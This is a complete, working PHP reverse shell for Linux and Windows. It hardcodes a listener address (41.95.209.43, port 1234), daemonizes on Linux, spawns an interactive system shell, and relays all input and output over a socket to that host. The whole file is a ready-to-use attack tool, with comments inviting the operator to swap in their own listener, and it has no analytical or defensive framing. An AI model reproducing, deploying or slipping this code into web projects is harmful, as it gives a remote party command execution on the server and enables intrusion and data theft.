<?php
// Cross-Platform PHP Reverse Shell for both Linux and Windows

set_time_limit(0); // No time limit
$VERSION = "1.0";

// Change these to match your listening machine (listener's IP and port)
$ip = '41.95.209.43'; // IP address of the listener (Change this)
$port = 1234;      // Port number of the listener (Change this)
$chunk_size = 1400; // Size of data chunk for reading/writing

// Define shell commands for Linux and Windows
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    $shell = 'cmd.exe'; // Use Windows CMD
} else {
    $shell = '/bin/sh -i'; // Use Linux interactive shell
}

$daemon = 0;
$debug = 0;

//
// Daemonize process to avoid zombies on Linux
//
if (function_exists('pcntl_fork') && strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
    // Fork and have the parent process exit (Linux only)
    $pid = pcntl_fork();
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    if ($pid) {
        exit(0);  // Parent exits
    }

    // Make the current process a session leader (Linux only)
    if (posix_setsid() == -1) {
        printit("ERROR: Can't setsid()");
        exit(1);
    }

    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonize. This is common on Windows and non-fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited (Linux only)
if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
    umask(0);
}

//
// Open reverse connection to the listener
//
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

// Define process descriptors
$descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

// Spawn shell process
$process = proc_open($shell, $descriptorspec, $pipes);

// Check if process was successfully opened
if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

// Set non-blocking mode for pipes and socket
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

//
// Main loop - Forward data between listener and shell
//
while (1) {
    // Check if the socket or process terminated
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }
    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    // Prepare streams for reading
    $read_a = array($sock, $pipes[1], $pipes[2]);
    
    // Fix for PHP 8.x - Need to declare variables for $write_a and $error_a
    $write_a = null;
    $error_a = null;
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // Read from socket and send to process stdin
    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }

    // Read from process stdout and send to socket
    if (in_array($pipes[1], $read_a)) {
        $output = fread($pipes[1], $chunk_size);
        fwrite($sock, $output);
    }

    // Read from process stderr and send to socket
    if (in_array($pipes[2], $read_a)) {
        $error_output = fread($pipes[2], $chunk_size);
        fwrite($sock, $error_output);
    }
}

// Close all pipes and sockets
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);

proc_close($process);

//
// Function to print output, but only if not daemonized
//
function printit($string) {
    global $daemon;
    if (!$daemon) {
        print "$string\n";
    }
}
?>
